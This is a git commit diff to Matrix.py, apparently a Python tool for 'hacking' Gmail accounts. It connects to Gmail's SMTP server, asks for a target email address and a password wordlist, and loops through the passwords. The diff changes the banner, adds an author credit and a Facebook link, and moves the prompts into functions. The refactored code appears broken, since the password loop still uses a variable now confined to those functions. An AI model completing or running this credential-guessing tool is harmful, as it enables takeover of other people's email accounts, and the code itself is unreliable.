059c06e0a4ce8876e3f64a12d46136506a20796e
MATRIX-8 <72356746+MATRIX-8@users.noreply.github.com>
2020-10-06 00:12:28 +0200

    Update Matrix.py

--- Matrix.py
+++ Matrix.py
@@ -3,28 +3,38 @@ import smtplib
 smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
-print(" \033[01;33m ____    __  __   ___      ___    __ __  __  __                                       ")
-print(" \033[01;33m/   __\ |  \| | /  _  \  /  _  \ |  o  \|  \|  |")
-print(" \033[01;33m\__   \ |     ||  (_)  ||  (_)  ||   __/ \__   |")
-print(" \033[01;33m\_____/ |_|\__| \_____/  \_____/ |__|   <______/ ")
-print("\033[01;34m                  By Matrix Badro karimo .============>>")
+print("\033[1;91m     ___  ___       ___   _____   _____    _  __    __       _____  __    __ ")
+print("\033[1;91m    /   |/   |     /   | |_   _| |  _  \  | | \ \  / /      /  _  \ \ \  / / ")
+print("\033[1;91m   / /|   /| |    / /| |   | |   | |_| |  | |  \ \/ /       | |_| |  \ \/ /  ")
+print("\033[1;91m  / / |__/ | |   / / | |   | |   |  _  /  | |   }  {        }  _  {   }  {   ")
+print("\033[1;91m / /       | |  / /  | |   | |   | | \ \  | |  / /\ \       | |_| |  / /\ \  ")
+print("\033[1;91m/_/        |_| /_/   |_|   |_|   |_|  \_\ |_| /_/  \_\      \_____/ /_/  \_\ ")
+print("\033[0;32m                    =========>> By Badrddin Mermouchi")
+print("\033[1;91m Facebook ==>> https://www.facebook.com/cori.justin.1/")
 print("                                                         ")
 print("\033[01;32m[01] \033[01;34mHack Gmail")
+def badr():
+    user = input("\033[01;33m[+] Email That you want to hack ===> :")
+    passwfile = input("\033[01;33m[+] 1\033[01;34mSelect a password list :")
+    passwfile = open(passwfile, "r")
 number = input("\033[01;32mTybe Your Number Please .... :")
 if number ==("1"):
     print ("\033[01;33m======> willcom <======")
+    badr()
 else:
     print("\033[01;33m===> Error The Number <===")
     print("\033[01;33m[*] \033[01;34mTybe Number '1' Please ....!")
     Number= input("\033[01;34m[+] \033[01;33mTybe The Namber :")
     if Number ==("1"):
         print("\033[01;33m .... \033[01;34mWillcom To My Programmer \033[01;33m 0....")
+        
+        badr()
     else:
         print("Error")
-
-user = input("\033[01;33m[+] Email That you want to hack ===> :")
-passwfile = input("\033[01;33m[+] \033[01;34mSelect a password list :")
-passwfile = open(passwfile, "r")
+def pidro():
+    user = input("\033[01;33m[+] Email That you want to hack ===> :")
+    passwfile = input("\033[01;33m[+] 1\033[01;34mSelect a password list :")
+    passwfile = open(passwfile, "r")
 
 for password in passwfile:
     try:
